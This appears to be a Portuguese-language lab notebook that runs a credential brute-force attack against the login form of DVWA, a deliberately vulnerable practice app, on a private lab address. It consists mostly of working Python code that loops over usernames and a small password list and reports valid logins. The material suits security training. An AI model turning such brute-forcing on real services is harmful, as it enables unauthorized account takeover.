### 🎯 Objetivo

Executar força bruta contra formulário de login da DVWA (Damn Vulnerable Web Application).

## 1. Setup

```python
import sys
import os
import requests
from pathlib import Path
from datetime import datetime
from dotenv import load_dotenv

load_dotenv(Path("../.env"))

TARGET_IP = os.getenv("TARGET_IP", "192.168.56.101")
DVWA_URL = f"http://{TARGET_IP}"

print(f"✅ Setup concluído")
print(f"   Target: {DVWA_URL}")
```

## 2. Reconhecimento DVWA

```python
print(f"\n🔍 Acessando DVWA\n")

try:
    response = requests.get(DVWA_URL, timeout=5)
    print(f"Status Code: {response.status_code}")
    
    if response.status_code == 200:
        print("✅ DVWA ACESSÍVEL")
        
        # Procurar por indicadores
        if "DVWA" in response.text:
            print("   Identificado: DVWA (Damn Vulnerable Web Application)")
        if "login" in response.text.lower():
            print("   Formulário de login encontrado")
    else:
        print(f"❌ Erro {response.status_code}")
except Exception as e:
    print(f"❌ Erro: {e}")

print("\n📝 Credenciais conhecidas de DVWA:")
default_creds = {
    "admin": "password",
    "user": "user",
}
for user, pwd in default_creds.items():
    print(f"  • {user}:{pwd}")
```

## 3. Brute Force Web

```python
print(f"\n🔓 Iniciando Brute Force Web (DVWA)\n")

users = ["admin", "user"]
passwords = ["password", "123456", "admin", "user", "12345678"]

print(f"Usuários: {len(users)}")
print(f"Senhas: {len(passwords)}")
print(f"Combinações: {len(users) * len(passwords)}\n")

login_url = f"{DVWA_URL}/login.php"
success_results = []

for user in users:
    for pwd in passwords:
        try:
            session = requests.Session()
            
            # GET para pegar o token CSRF
            resp = session.get(login_url, timeout=5)
            
            # Preparar dados
            payload = {
                'username': user,
                'password': pwd,
                'Login': 'Login'
            }
            
            # POST com credenciais
            resp = session.post(login_url, data=payload, timeout=5)
            
            # Verificar se login foi bem-sucedido
            if resp.status_code == 200 and ('logout' in resp.text.lower() or 'dashboard' in resp.text.lower() or 'security level' in resp.text.lower()):
                print(f"✅ CREDENCIAL VÁLIDA: {user}:{pwd}")
                success_results.append((user, pwd))
            else:
                print(f"❌ {user}:{pwd} - Falhou")
        except Exception as e:
            print(f"⚠️ Erro testando {user}:{pwd}")

if success_results:
    print(f"\n🎉 Encontrado {len(success_results)} credencial(is):")
    for user, pwd in success_results:
        print(f"   {user}:{pwd}")
else:
    print("\n⚠️ Nenhuma credencial bem-sucedida neste teste")
    print("   Credenciais padrão: admin:password")
```
